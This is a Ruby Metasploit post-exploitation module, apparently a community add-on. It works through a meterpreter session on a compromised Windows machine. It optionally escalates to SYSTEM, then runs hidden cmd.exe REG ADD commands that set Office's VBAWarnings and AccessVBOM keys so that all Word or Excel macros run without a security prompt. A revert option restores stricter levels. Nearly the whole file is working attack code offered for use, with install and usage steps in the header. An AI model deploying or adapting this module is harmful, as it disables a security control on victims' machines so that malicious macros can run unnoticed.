##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Bypass macro security warning sandbox (registry).
# $Id$ 1.6 Author: r00t-3xp10it | SSA RedTeam @2016
# 'next time target machine reboot it will let us run office macros without prompt the security warning sandbox!
# Credits: https://blogs.technet.microsoft.com/diana_tudor/2014/12/02/microsoft-project-how-to-control-macro-settings-using-registry-keys/
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-module controls macro security warning sandbox settings using registry keys 'VBAWarnings'
# and 'AccessVBOM' that changes the security level for Word/Excel macro down to 'Enable all macros'.
# Also advanced 'DWORD' option allow us to set macro security levels from dword:2 until dword:4
# Vulnerable softwares are => Microsoft Office Word/Excel versions from 10.0 >= 16.0
#
#
# [ POST MODULE OPTIONS ]
# The session number to run this module on    => set SESSION 1
# Elevate session to 'nt authority/system'    => set GET_SYSTEM true
# change 'VBSWarnings' to dword:1  (bypass)   => set MACRO_BYPASS true
# Revert 'VBSWarnings' to dword:2 (default)   => set REVERT_BYPASS true
# Chose to exploit Word or Excel software     => set EXPLOIT Excel
# Select macro security level (default:2)     => set DWORD 4
# ---
#  dword:1 Enable All Macros
#  dword:2 Disable All macros with notification
#  dword:3 Disable all macros except those digitally signed
#  dword:4 Disable all without notification
# ---
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/bypass_macro_sandbox.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/bypass_macro_sandbox.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/bypass_macro_sandbox
# msf post(bypass_macro_sandbox) > info
# msf post(bypass_macro_sandbox) > show options
# msf post(bypass_macro_sandbox) > show advanced options
# msf post(bypass_macro_sandbox) > set [option(s)]
# msf post(bypass_macro_sandbox) > exploit
##






# -----------------------------------
# Module Dependencies
# -----------------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
 
 
 
# -------------------------------------
# Metasploit Class name and libs
# -------------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Registry


 
 
# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Bypass macro security warning sandbox',
                        'Description'   => %q{

                                        This post-module controls macro security warning sandbox settings using registry keys 'VBAWarnings' and 'AccessVBOM' that changes the security level for Word/Excel macro down to 'Enable all macros'. Also advanced 'DWORD' option allow us to set macro security levels from dword:2 until dword:4, Vulnerable softwares are => Microsoft Office Word/Excel versions from 10.0 >= 16.0

                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                        'inspiration: Filipe [ Excel Class ]', # inspiration
                                        'Special thanks: milton_barra' # debugging module
                                ],
 
                        'Version'        => '$Revision: 1.6',
                        'DisclosureDate' => 'ago 30 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # Tested againts Windows 10 | windows 7 (SP1) | windows XP (SP3)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts Windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'goo.gl/ALBY2M' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'https://www.howto-outlook.com/howto/selfcert.htm' ],
                                         [ 'URL', 'http://powerspreadsheets.com/how-to-enable-macros-excel/' ],
                                         [ 'URL', 'https://ittechlog.wordpress.com/2013/02/21/disabling-the-office-2010-security-misery' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',     # Default its to run againts session 1
                                        'DWORD'   => '2',     # macro security default settings (2 => Disable All macros with notification)
                                        'EXPLOIT' => 'Word',  # default its to run againts Word software (or Excel)
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('GET_SYSTEM', [ false, 'Elevate current session to nt authority/system' , false]),
                                OptBool.new('MACRO_BYPASS', [ false, 'Bypass macro security warning sandbox (regedit)' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('EXPLOIT', [ false, 'Chose to exploit Word or Excel software']),
                                OptString.new('DWORD', [ false, 'select macro security level (from dword:2 to dword:4)']),
                                OptBool.new('REVERT_BYPASS', [ false, 'Revert macro security warning sandbox bypass' , false])
                        ], self.class)
 
        end

 


# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   sys = session.sys.config.sysinfo
   print_error("Operative System: #{sys['OS']}")
   print_error("This auxiliary only works against windows systems!")
   print_warning("Please execute [info] for further information...")
   print_line("")
   raise Rex::Scrip::Completed
end




# ----------------------------------------
# 'Privilege escalation' - Getting @SYSTEM
# ----------------------------------------
def priv_escal

  toor = []
  # variable API declarations
  toor = client.sys.config.getuid
  print_warning("Client UID: #{toor}")
  print_status("Escalate client session to: nt authority/system")

    # getprivs API call loop funtion
    client.sys.config.getprivs.each do |priv|
    print_good(" Impersonate token => #{priv}")
    end
 
    # checking results (if_system)
    result = client.priv.getsystem
      if result and result[0]
 
        csuid = []
        csuid = client.sys.config.getuid
        # print results on screen if successefully executed
        print_status("Current client UID: #{csuid}")
        print_line("")

      else
      # error display in executing command
      print_error("Fail to obtain [nt authority/system] access!")
      print_warning("Please manually run: getsystem to gain system privs!")
      print_line("")
      end
end




# ---------------------------------------------------
# 1 - find Microsoft Office version number Installed
# 2 - Add [bypass] registry key 'VBAWarnings' (dword:1)
# 3 - Add [bypass] registry key 'AccessVBOM' (dword:1)
# ---------------------------------------------------
def bypass_exploit

  r=''
  key=''
  path = []
  version = []
  # variable declarations
  key = "VBAWarnings"
  software = datastore['EXPLOIT']
  path = "HKCU\\Software\\Microsoft\\Office\\"
  print_status("Bypass Office macro sandbox security warnings!")
  print_status("Checking Microsoft Office version installed...")

    # determine office version number Installed
    # and set dword key name (depending of version)
    if registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\10.0")
      version = "10.0"
      key = "Level"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\11.0")
      version = "11.0"
      key = "Level" # All versions < 12.0 uses 'Level' dword key name
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\12.0")
      version = "12.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\13.0")
      version = "13.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\14.0")
      version = "14.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\15.0")
      version = "15.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\16.0")
      version = "16.0"
    else
      print_error("Microsoft Office version: [ NOT ] found.. Aborting tasks...")
      print_warning("Please check: [ #{path} ] to determine version installed...")
      print_line("")
      return
    end

      print_warning("  Microsoft Office version detected => #{version}")
      # Bypass macro sandbox security warning using regedit [ dword:1 Enable All Macros ] ...
      # Raw Key: "HKCU\Software\Microsoft\Office\16.0\Excel\security /v VBAWarnings /t REG_DWORD /d 1 /f"
      bypass="HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security /v #{key} /t REG_DWORD /d 1 /f"
      access="HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security /v AccessVBOM /t REG_DWORD /d 1 /f"
      refres="RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True" # This key will refresh target system

        # execute cmd prompt in a hidden channelized windows to manipulate regedit using native cmd...
        r = session.sys.process.execute("cmd.exe /c REG ADD #{bypass}", nil, {'Hidden' => true, 'Channelized' => true})
        r = session.sys.process.execute("cmd.exe /c REG ADD #{access}", nil, {'Hidden' => true, 'Channelized' => true})
        r = session.sys.process.execute("cmd.exe /c REG ADD #{refres}", nil, {'Hidden' => true, 'Channelized' => true})
        print_good("  exec => #{bypass}")
        print_good("  exec => #{access}")
        print_good("  exec => #{refres}")

      # close client channel
      r.channel.close
      r.close


    # - EXPLOIT REPORT -
    # funtion to check if the rigth key data as injected...
    check_success = registry_getvaldata("HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security","#{key}")
    if check_success == 1
      print_status("[REMARK]: next REBOOT will let us run macros WITHOUT security warnings...")
      print_line("     _")
      print_line("    | Software    : #{software} (#{version})")
      print_line("    | Keys        : #{key} (dword:#{check_success}) | AccessVBOM (dword:1)")
      print_line("    |_Description : Enable All Macros.")
      print_line("")
    else
      print_error("[ERROR]: function cant verify registry key Injection...")
      print_error("[POSSIBLE CAUSES]: session its not elevated to SYSTEM privileges ?")
      print_warning("Please manually check: HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security - #{key}")
      print_line("")
      return
    end
end




# ---------------------------------------------------------------------
# 1 - find Microsoft Office version number Installed...
# 2 - revert [bypass] registry key 'VBAwarnings'(dword:2) <-- default
# 3 - Add [bypass] registry key 'AccessVBOM' (dword:0) <-- default
# "THIS FUNTION ALSO GIVE US THE ABILITY TO SET A DIFERENT DWORD VALUE"
# ---------------------------------------------------------------------
def revert_bypass

  r=''
  key=''
  path = []
  version = []
  # variable declarations
  key = "VBAWarnings"
  value = datastore['DWORD'] 
  software = datastore['EXPLOIT']
  path = "HKCU\\Software\\Microsoft\\Office\\"
  print_status("Revert Office macro security level to dword:#{value}")
  print_status("Checking Microsoft Office version installed...")

    # determine office version number Installed
    # and set dword key name (depending of version)
    if registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\10.0")
      version = "10.0"
      key = "Level"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\11.0")
      version = "11.0"
      key = "Level" # All versions < 12.0 uses 'Level' dword key name
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\12.0")
      version = "12.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\13.0")
      version = "13.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\14.0")
      version = "14.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\15.0")
      version = "15.0"
    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\16.0")
      version = "16.0"
    else
      print_error("Microsoft Office version: [ NOT ] found.. Aborting tasks...")
      print_warning("Please check: [ #{path} ] to determine the version installed...")
      print_line("")
      return
    end

        # display detailed description of dword value sellected to inject...
        # and at the same time restrict the use of dword:0 or dword:1...
        if datastore['DWORD'] == '0' || datastore['DWORD'] == '1'
          print_error("This function does not support [ dword: #{value} ]")
          print_warning("please set DWORD to [ 2 | 3 | 4 ] run levels...")
          print_line("")
          return
        elsif datastore['DWORD'] == '2'
          lvl = "Disable All macros with notification."
        elsif datastore['DWORD'] == '3'
          lvl = "Disable all macros except those digitally signed."
        elsif datastore['DWORD'] == '4'
          lvl = "Disable all without notification."
        else
          print_error("This function does not support [ dword: #{value} ]")
          print_warning("please set DWORD to [ 2 | 3 | 4 ] run levels...")
          print_line("")
          return
        end

      # Revert macro sandbox security warning using regedit...
      print_warning("  Microsoft Office version detected => #{version}")
      # Raw Key: "HKCU\Software\Microsoft\Office\11.0\Word\Security /v Level /t REG_DWORD /d 2 /f"
      revert="HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security /v #{key} /t REG_DWORD /d #{value} /f"
      access="HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security /v AccessVBOM /t REG_DWORD /d 0 /f"
      refres="RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True" # This key will refresh target system

        # execute cmd prompt in a hidden channelized windows to manipulate regedit using native cmd...
        r = session.sys.process.execute("cmd.exe /c REG ADD #{revert}", nil, {'Hidden' => true, 'Channelized' => true})
        r = session.sys.process.execute("cmd.exe /c REG ADD #{access}", nil, {'Hidden' => true, 'Channelized' => true})
        r = session.sys.process.execute("cmd.exe /c REG ADD #{refres}", nil, {'Hidden' => true, 'Channelized' => true})
        print_good("  exec => #{revert}")
        print_good("  exec => #{access}")
        print_good("  exec => #{refres}")

      # close client channel
      r.channel.close
      r.close
 
    # - EXPLOIT REPORT -
    # funtion to check if the rigth key data as injected...
    check_success = registry_getvaldata("HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security","#{key}")
    if check_success == 2 || check_success == 3 || check_success == 4
      print_status("[REMARK]: Microsoft Office macro auto-execution: Disabled...")
      print_line("     _")
      print_line("    | Software    : #{software} (#{version})")
      print_line("    | Keys        : #{key} (dword:#{check_success}) | AccessVBOM (dword:0)")
      print_line("    |_Description : #{lvl}")
      print_line("")
    else
      print_error("[ERROR]: function cant verify registry key Injection...")
      print_error("[POSSIBLE CAUSES]: session its not elevated to SYSTEM privileges ?")
      print_warning("Please manually check: HKCU\\Software\\Microsoft\\Office\\#{version}\\#{software}\\Security - #{key}")
      print_line("")
      return
    end
end





# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# ------------------------------------------------
def run

  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +-----------------------------------------+")
    print_line("    |     * macro warning sandbox bypass *    |")
    print_line("    |   Author: Pedro Ubuntu [ r00t-3xp10it ] |")
    print_line("    +-----------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end


# ------------------------
# Selected settings to run
# ------------------------
      if datastore['GET_SYSTEM']
         priv_escal
      end

      if datastore['MACRO_BYPASS']
         bypass_exploit
      end

      if datastore['REVERT_BYPASS']
         revert_bypass
      end
   end
end
